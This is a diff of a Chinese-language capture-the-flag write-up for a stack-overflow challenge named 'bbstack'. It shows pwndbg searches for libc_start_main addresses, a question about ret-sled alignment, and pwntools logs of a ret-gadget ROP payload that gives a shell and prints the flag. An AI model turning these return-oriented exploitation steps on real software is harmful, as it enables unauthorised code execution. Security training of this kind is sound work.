@@ -23,65 +23,42 @@ ret
 ...
 system                  # 0x4047c0
 ```
-![](https://r2.20161023.xyz/pic/20250710100816424.png)
 
-### 三处libc_start_main+125的地址
+![](https://r2.20161023.xyz/pic/20250710120635590.png)
+### 两处libc_start_main+125的地址
 ```
-pwndbg> find 0x404000, 0x404fff,  0x7fa2b898c07d
+pwndbg> find 0x404000, 0x404fff,  0x7f8a62d3507d
 0x4046c0
 0x4047c0
-0x4048c0
-3 patterns found.
+2 patterns found.
 ```
 
 ## call libc_start_main_ptr
 ![](https://r2.20161023.xyz/pic/20250710095617812.png)
 
 ## 疑问
-最后ret滑行的时候，read很多ret的时候，怎么有个00
+最后ret滑行的时候，read很多ret的时候，怎么有个00,把rsp的值往下面加一些再试就可以了，不知道为啥？
 
 ![](https://r2.20161023.xyz/pic/20250709180031099.png)
 
 # getshell
 ```
+[*] Paused (press any to continue)
 [DEBUG] Sent 0xf8 bytes:
-    00000000  80 48 40 00  00 00 00 00  b2 10 40 00  00 00 00 00  │·H@·│····│··@·│····│
-    00000010  b2 10 40 00  00 00 00 00  b2 10 40 00  00 00 00 00  │··@·│····│··@·│····│
+    00000000  f8 48 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │·H@·│····│··@·│····│
+    00000010  1a 10 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │··@·│····│··@·│····│
     *
-    000000f0  b2 10 40 00  00 00 00 00                            │··@·│····│
+    000000f0  1a 10 40 00  00 00 00 00                            │··@·│····│
     000000f8
+/home/task/2025/07-08-shanxi/bbstack/exp.py:123: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  io.sendline("cat flag*")
+[DEBUG] Sent 0xa bytes:
+    b'cat flag*\n'
 [*] Switching to interactive mode
-$ ls
-[DEBUG] Sent 0x3 bytes:
-    b'ls\n'
-[DEBUG] Received 0x38 bytes:
-    b'bbstack\n'
-    b'bin\n'
-    b'dev\n'
-    b'flag\n'
-    b'lib\n'
-    b'lib32\n'
-    b'lib64\n'
-    b'libexec\n'
-    b'libx32\n'
-    b'usr\n'
-bbstack
-bin
-dev
-flag
-lib
-lib32
-lib64
-libexec
-libx32
-usr
-$ cat flag
-[DEBUG] Sent 0x9 bytes:
-    b'cat flag\n'
 [DEBUG] Received 0x27 bytes:
-    b'flag{ilkrSlIWLcOLfDJTT7qSnOjVhlim9ODr}\n'
-flag{ilkrSlIWLcOLfDJTT7qSnOjVhlim9ODr}
+    b'flag{j5k12fiFYo8ZHC7ULebHK7hYRvqMFaeC}\n'
+flag{j5k12fiFYo8ZHC7ULebHK7hYRvqMFaeC}
 $
-
 ```
-![](https://r2.20161023.xyz/pic/20250708182043881.png)
+
+![](https://r2.20161023.xyz/pic/20250710120955678.png)
